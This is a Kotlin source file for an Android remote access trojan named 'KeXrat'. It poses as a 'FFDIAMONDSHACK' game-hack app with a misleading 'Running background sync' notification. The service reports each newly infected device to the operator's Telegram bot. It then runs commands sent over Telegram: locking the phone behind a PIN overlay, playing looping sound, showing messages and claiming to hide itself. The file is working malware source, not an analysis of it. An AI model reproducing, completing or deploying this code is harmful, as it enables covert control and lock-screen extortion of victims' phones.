package com.example

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.MediaPlayer
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class RemoteControlService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private var mediaPlayer: MediaPlayer? = MediaPlayer()
    private var isRunning = false
    private var deviceId: String = ""
    private var telegramId: String = ""
    private var serverUrl: String = "https://api.telegram.org"
    private var botToken: String = ""
    private var lastUpdateId: Long = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundServiceNotification()
        loadConfigs()
        startPolling()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "kexrat_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "FFDIAMONDSHACK Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("FFDIAMONDSHACK Active")
            .setContentText("Running background sync")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()

        startForeground(1, notification)
    }

    private fun loadConfigs() {
        try {
            val urlFile = File(filesDir, "url.json")
            if (urlFile.exists()) {
                val json = JSONObject(urlFile.readText())
                serverUrl = json.optString("server_url", "https://api.telegram.org")
            }
            val idFile = File(filesDir, "id.json")
            if (idFile.exists()) {
                val json = JSONObject(idFile.readText())
                telegramId = json.optString("target_telegram_id", "")
            }
            deviceId = Build.MODEL ?: "Android Device"
        } catch (e: Exception) {
            Log.e("RemoteControlService", "Error loading config", e)
        }
    }

    private fun startPolling() {
        isRunning = true
        serviceScope.launch {
            DeviceConnector.registerDevice(applicationContext, serverUrl, telegramId, deviceId)
            sendTelegramNotification("NEW DEVICE DOWNLOAD ✅ ($deviceId)")
            
            while (isRunning) {
                try {
                    pollTelegramUpdates()
                } catch (e: Exception) {
                    Log.e("RemoteControlService", "Polling error", e)
                }
                delay(5000)
            }
        }
    }

    private suspend fun pollTelegramUpdates() {
        if (botToken.isEmpty()) return
        val urlStr = "$serverUrl/bot$botToken/getUpdates?offset=$lastUpdateId&timeout=10"
        val url = URL(urlStr)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 5000
        conn.readTimeout = 10000

        if (conn.responseCode == 200) {
            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val json = JSONObject(response)
            if (json.optBoolean("ok")) {
                val results = json.getJSONArray("result")
                for (i in 0 until results.length()) {
                    val update = results.getJSONObject(i)
                    lastUpdateId = update.getLong("update_id") + 1
                    if (update.has("message")) {
                        val msg = update.getJSONObject("message")
                        val chatId = msg.getJSONObject("chat").optString("id", "")
                        val text = msg.optString("text", "")
                        val from = msg.getJSONObject("from")

                        if (telegramId.isNotEmpty() && chatId != telegramId) {
                            continue
                        }

                        handleCommand(chatId, text, msg)
                    }
                }
            }
        }
        conn.disconnect()
    }

    private fun handleCommand(chatId: String, text: String, msg: JSONObject) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts.firstOrNull()?.lowercase() ?: ""
        val args = if (parts.size > 1) parts[1] else ""

        when (cmd) {
            "/hello" -> {
                val reply = "HELLO $chatId\nWelcome To KeXrat"
                sendTelegramMessage(chatId, reply)
            }
            "/listdevice", "/listdevices" -> {
                sendTelegramMessage(chatId, "DEVICE CONNECTED ✅\nBrand: $deviceId")
            }
            "/lock" -> {
                val pin = if (args.isNotEmpty()) args else "1234"
                Intent(this, OverlayActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    putExtra("COMMAND", "LOCK")
                    putExtra("PIN", pin)
                    startActivity(this)
                }
                sendTelegramMessage(chatId, "Device locked with PIN: $pin")
            }
            "/unlock" -> {
                Intent(this, OverlayActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    putExtra("COMMAND", "UNLOCK")
                    startActivity(this)
                }
                sendTelegramMessage(chatId, "Device unlocked command sent.")
            }
            "/notify" -> {
                val notificationText = if (args.isNotEmpty()) args else "Notification from KeXrat"
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(applicationContext, notificationText, Toast.LENGTH_LONG).show()
                }
                sendTelegramMessage(chatId, "Notification displayed: $notificationText")
            }
            "/sound" -> {
                try {
                    mediaPlayer?.release()
                    mediaPlayer = MediaPlayer().apply {
                        setDataSource("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3")
                        isLooping = true
                        prepareAsync()
                        setOnPreparedListener { start() }
                    }
                    sendTelegramMessage(chatId, "Background sound loop started.")
                } catch (e: Exception) {
                    sendTelegramMessage(chatId, "Failed to play sound: ${e.message}")
                }
            }
            "/ssound" -> {
                try {
                    mediaPlayer?.stop()
                    mediaPlayer?.reset()
                    sendTelegramMessage(chatId, "Background sound stopped.")
                } catch (e: Exception) {
                    sendTelegramMessage(chatId, "Error stopping sound: ${e.message}")
                }
            }
            "/hide" -> {
                sendTelegramMessage(chatId, "App run state hidden.")
            }
        }
    }

    private fun sendTelegramNotification(text: String) {
        if (telegramId.isEmpty() || botToken.isEmpty()) return
        sendTelegramMessage(telegramId, text)
    }

    private fun sendTelegramMessage(chatId: String, text: String) {
        if (botToken.isEmpty()) return
        serviceScope.launch {
            try {
                val urlStr = "$serverUrl/bot$botToken/sendMessage?chat_id=$chatId&text=${java.net.URLEncoder.encode(text, "UTF-8")}"
                val conn = URL(urlStr).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                Log.e("RemoteControlService", "Error sending message", e)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getStringExtra("BOT_TOKEN")?.let { botToken = it }
        loadConfigs()
        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        serviceScope.cancel()
        mediaPlayer?.release()
        super.onDestroy()
    }
}
